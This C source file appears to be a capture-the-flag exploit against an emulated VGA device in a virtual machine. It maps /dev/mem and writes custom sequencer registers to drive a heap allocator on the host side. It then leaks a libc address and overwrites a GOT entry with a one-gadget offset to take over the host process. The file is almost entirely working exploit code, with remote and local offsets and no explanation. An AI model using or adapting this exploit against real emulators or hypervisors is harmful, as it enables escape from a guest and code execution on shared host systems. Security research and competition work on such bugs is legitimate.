#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/io.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

uint8_t *mem;
int port_fd;

void log(uint8_t *msg) { write(1, msg, strlen(msg)); }

void log2(uint8_t *msg, int size) { write(1, msg, size); }

void read_str(uint8_t *buf, int size) { read(0, buf, size); }

void err(char *msg) {
  log(msg);
  exit(-1);
}

void __syscall_error() {
  char *msg = "__syscall_error\n";
  log(msg);
}

void get_mem() {
  int fd;

  fd = open("/dev/mem", O_RDWR | O_SYNC);
  if (fd == -1) {
    err("cannot open /dev/mem");
  }

  mem = (uint8_t *)mmap(0, 0x20000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0xa0000);
  if (mem == MAP_FAILED) {
    err("cannot mmap /dev/mem");
  }
}

void set_sr(uint8_t index) { outb(index, 0x3C4); }

void write_sr(uint8_t value) { outb(value, 0x3C5); }

void write_vga_mem(uint8_t val) { mem[0x10001] = val; }

void write_size(uint32_t size) {
  set_sr(0xcd);
  write_sr((size >> 16) & 0xff);
  set_sr(0xce);
  write_sr((size >> 8) & 0xff);
  write_vga_mem(size & 0xff);
}

void setup() {
  get_mem();

  if (ioperm(0x3C4, 2, 1) == -1) {
    err("cannot ioperm");
  }

  set_sr(7);
  write_sr(1);
}

void set_mode(uint8_t mode) {
  set_sr(0xcc);
  write_sr(mode);
}
void do_malloc(int size) {
  set_mode(0);
  write_size(size);
}

void do_write(int index, uint8_t *data, size_t size) {
  set_mode(1);
  for (int i = 0; i < size; ++i) {
    write_size(index << 16 | data[i]);
  }
}

void do_show(int index) {
  set_mode(2);
  write_size(index << 16);
}

void do_set_size(int index, size_t size) {
  set_mode(3);
  write_size(index << 16 | size);
}

uint8_t payload[0x100];

uint64_t libc;
uint8_t tmp1[8];

int _start() {
  log("Hi\n");
  setup();

  // setup new line for flushing stdout
  do_malloc(0x10);
  do_write(0, "\n\x00", 2);
  tmp1[0] = mem[1];


  // uint32_t addr = 0xEE7028;  // local offset
  uint32_t addr = 0xdea2d8;     // remote offset

  // set the latch to our address
  tmp1[0] = mem[addr >> 0x10];
  tmp1[0] = mem[addr & 0xffff];

  // leak __printf_chk address
  log("Leak\n");
  do_show(0x10);
  do_show(0);

   // read libc base from our wrapper script
  log("Addr:\n");
  read_str(payload, 17);
  payload[16] = 0;
  
  // set to magic gadget
  libc = strtoul(payload, NULL, 16);
  libc += 0x45216;

  // overwrite got with gadget
  do_set_size(0x10, 0x1000);
  do_write(0x10, &libc, 8);
  do_show(0x10);

  log("Done\n");
  exit(0);
}
